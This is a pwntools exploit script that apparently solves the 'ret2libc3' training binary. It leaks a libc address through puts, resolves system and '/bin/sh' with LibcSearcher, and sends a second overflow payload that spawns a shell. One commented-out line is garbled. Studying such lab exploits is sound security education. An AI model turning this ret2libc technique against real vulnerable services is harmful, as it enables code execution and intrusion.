from pwn import *
from LibcSearcher import *

sh = process('./ret2libc3')

elf = ELF('./ret2libc3')

puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

print('leak libc_start_main_got addr and return to main again')
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print('get the related addr')
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']
# system_addr = libc_base + libc.symbols['system']libc_start_main_addr
# binsh_addr = libc_base + next(libc.search('/bin/sh'))

print('get shell')
payload2 = flat(['A'* 104, system_addr, 0xdeafbeef, binsh_addr])
sh.sendline(payload2)
sh.interactive()